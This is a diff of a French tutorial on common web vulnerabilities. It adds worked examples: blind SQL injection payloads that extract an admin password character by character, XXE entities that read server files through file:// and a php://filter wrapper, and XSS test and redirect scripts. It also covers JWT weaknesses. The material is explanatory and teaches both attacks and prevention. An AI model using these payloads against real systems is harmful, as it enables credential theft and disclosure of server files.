@@ -37,29 +37,63 @@ Pour rentrer plus en profondeur je vais détailler 4 injections SQL
 
 **Attaque 1 : Blind Based**
 
-L'injection aveugle SQL est un type d'attaque qui pose des questions à la base de données et détermine la réponse en fonction de la réponse des applications, exemple, ici notre mot de passe est "password", j'envoie une requête serveur et je devine le mot de passe au fur à mesure.
+L'injection de type aveugle ( ou 'Blind based' ) est une injection où ne connait rien de la base de donnée.
 
-Rappel : le "%" est essentiel, il permet de dire "Et tous le reste".
+IMAGE1 TAIQUI
 
-IMAGE ExempleBlind
+Prenons cette page de connexion classique. Ici nous avons aucune information sur ce qu'il peut avoir dans la base de donnée. Le but de cette attaque est de récupéré ( et non de se connecter simplement ) le mot de passe de l'administrateur. Dans une grande majorité des cas le nom de compte sera admin, on reprendra donc cette forte probabilité pour n'avoir que le mot de passe à trouver. On peut supposé aussi que le nom de la table sera users.
 
-Requête SQL
+On va donc commence à tester une à une les lettres de alphabète, majuscule,minuscule ainsi que les chiffres et quelque caractères spéciaux, attention certain caractère son interdit, ils ont une signification spéciale suivant la base de donnée ainsi que sa version employé.
 
-**Attaque 2 : Time Based**
+La majorité des cas que vous pourrez voir utiliseront substr, ici pour changer un peu, nous allons utilisé left(chaine,taille) qui permet de ressortir taille caractères de chaine.
 
-Presque identique à la première, cependant, la réponse est déterminé en fonction du temps de réponse des applications, exemple : si la réponse se fait en 1 seconde c'est vrais, si elle ce fait en 5 seconde c'est faux. De ce fait on peut faire comme la première et déterminé le mot de passe en au fur à mesure suivant le temps de réponse.
+ex : left("Salut",2) => 'Sa'
 
-IMAGE ExempleTime
+on a donc USERNAME à remplir ainsi que PASSWORD
 
-**Attaque 3 : Error Based**
+```
+username="admin' and (select left(password,1)) from users where
+name='admin')='a' -- -
+password="salut"
+```
+
+Nous remplirons les champs USERNAME et PASSWORD comme décrit au dessus pour un premier essais 
+
+Supposons que la page nous renvois :
+
+IMAGE2 TAIQUI
+
+On en conclus donc que le mot de passe ne commence pas par la lettre a.
+
+Après avoir testé plusieurs cas, avec la commande suivante :
+
+```
+USERNAME = "admin' and (select left(password,1)) from users where
+name='admin')='3' -- - "
+```
+
+Il nous apparait ceci :
+
+IMAGE3 TAIQUI
+
+On en conclut donc que le premier caractère de notre mots de passe est '3'.
+
+On peut donc passé au deuxième comme ceci 
+
+```
+USERNAME = "and (select left(password,2)) from users where name='admin')='3a'
+-- -"
+```
+
+Et ainsi de suite jusqu'à trouvé toute les lettres. Voila vous comprenais maintenant l'injection SQL de type aveugle !
+
+**Attaque 2 : Error Based**
 
 Cette méthode profite d'une faiblesse des systèmes de base de données permettant de détourner un message d'erreur généré par la base de données et préalablement volontairement provoquée par l'injection SQL pour lui faire retourner une valeur précise récupérée en base de données
 
-**Attaque 4 : Union Based**
+**Attaque 3 : Union Based**
 
 L'injection SQL basée sur l'Union est une technique d'injection qui exploite l'opérateur SQL UNION qui est utilisé pour combiner le résultat de deux ou plusieurs instructions SELECT en un seul résultat
-
-IMAGE ExempleUnion
 
 ### Prévention
 
@@ -230,11 +264,62 @@ Les applications et en particulier les services Web basés sur XML ou les intég
 
 **Attaque 2 : XXE**
 
-Une attaque d' entité externe XML est un type d'attaque contre une application qui analyse une entrée XML. Cette attaque se produit lorsque l' entrée XML contenant une référence à une entité externe est traitée par un analyseur XML faiblement configuré . 
+Une XXE de son nom XML External Entity, est une injection par du langage XML. Prenons un site lambda permettant d'inserer du code XML, par exemple pour donner une police d'écriture spéciale, une taille d'écriture spéciale etc.
 
-Cette attaque peut entraîner la divulgation de données confidentielles, un déni de service, la falsification de requêtes côté serveur, la numérisation de port du point de vue de la machine sur laquelle se trouve l'analyseur et d'autres impacts sur le système.
+IMAGEXXE1 TAIQUI
 
-IMAGE ExempleXEE
+La base d'un code XML ressemble à ceci :
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title>Mon site</title>
+		<description>Ceci est un exemple de flux RSS 2.0</description>
+		<lastBuildDate>Sat, 07 Sep 2002 00:00:01 GMT</lastBuildDate>
+		<link>http://www.example.org</link>
+		<item>
+			<title>Actualité N°1</title>
+			<description>Ceci est ma première actualité</description>
+			<pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
+			<link>http://www.example.org/actu1</link>
+		</item>
+		<item>
+			<title>Actualité N°2</title>
+			<description>Ceci est ma seconde actualité</description>
+			<pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
+			<link>http://www.example.org/actu2</link>
+		</item>
+	</channel>
+</rss>
+```
+
+La méthode pour notre attaque qui va être d'injecté du code que le serveur exécutera, sera d'ajouté dans le header du fichier une commande dans ce genre la :
+
+```
+<!DOCTYPE HELLO [
+<!ENTITY XXE_REKT SYSTEM "SOMETHING" >
+]><title>&XXE_REKT;</title>
+```
+
+Ici il faut ajouté dans SOMETHING quelque chose que le serveur pourra traité. On pourrai choisir d'affiché par exemple le code source d'une page de login par exemple :
+
+```
+<!DOCTYPE HELLO [
+<!ENTITY XXE_REKT SYSTEM "file:///PATH/TO/FILE/login.php" >
+]><title>&XXE_REKT;</title>
+```
+
+On pourrai notamment poussé l'exploitation plus loin en outrepassant des filtres basique en utilisant des WRAPPER php qui sont des fonction interne a PHP.
+
+```
+<!DOCTYPE HELLO [
+<!ENTITY XXE_REKT SYSTEM "php://filter/read=convert.base64-
+encode=PATH/TO/FILE" >
+]><title>&XXE_REKT;</title>
+```
+
+Ceci nous retournerais le code sources du fichier demandé en base64, il nous resterait uniquement à décoder ce fichier pour avoir le code en clair !
 
 ### Prévention
 
@@ -277,7 +362,7 @@ Le contrôle d'accès applique une stratégie telle que les utilisateurs ne peuv
 
 **Attaque 1 : JSON Web Token (JWT)**
 
-JSON Web token permet l'échange sécurisé de jetons entre plusieurs parties cependant, on peut usurper un token ou encore trompé la vérification de la signature ou encore déchiffré des "secrets" facilement avec des dictionnaires.
+JSON Web token permet l'échange sécurisé de jetons entre plusieurs parties. Le principe est simple, un hash est générer qui servira de signature pendant une certaine durée. Ce token va ensuite transiter dans chaque requête entre le client et le serveur.
 
 Un JSON Web token est construis en 3 parties.
 
@@ -287,6 +372,8 @@ Un JSON Web token est construis en 3 parties.
 On peut voir les tokens si l'on inspecte la page dans la partie "network", un exemple d'un TOKEN.
 
 *eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk*
+
+Cependant on peut usurper un token ou encore trompé la vérification de la signature ou encore déchiffré des "secrets" facilement avec des dictionnaires.
 
 Si l'on décode chaque partie cela donne :
 
@@ -344,10 +431,6 @@ L'application peut être vulnérable si l'application est:
 
 **Attaque 1 : Insecure Code Management**
 
-Certain site web laisse parfois des accès a des informations sensible, un exemple avec le .git
-
-On remarque sur un site web que l'administrateur à laisser u
-
 ### Prévention
 
 Des processus d'installation sécurisés doivent être mis en œuvre, notamment:
@@ -389,11 +472,17 @@ Pour tester si une faille XSS existe, la manière la plus simple est d’injecte
 
 Cette commande permet de voir si le site est faillible à du XSS elle est à retenir 
 
-- <script>alert(1)</script>
+- <script>alert(1)</script>*
 
-Si lorsque j’envoie mon script Javascript, une pop-up apparait. la faille est bien présente dans le formulaire.
+ *alert : fait apparaitre une fenêtre sur le navigateur
+
+Si lorsque j’envoie mon script Javascript, une fenêtre apparait. la faille est bien présente dans le formulaire.
 
 Ensuite je dois construire ma XSS pour récupéré un cookie ou faire une redirection vers un site malveillant.
+
+Exemple d'une XSS de redirection 
+
+- <script>document.location="https://www.redirection.com/"</script>
 
 IMAGE ExempleXSS
 
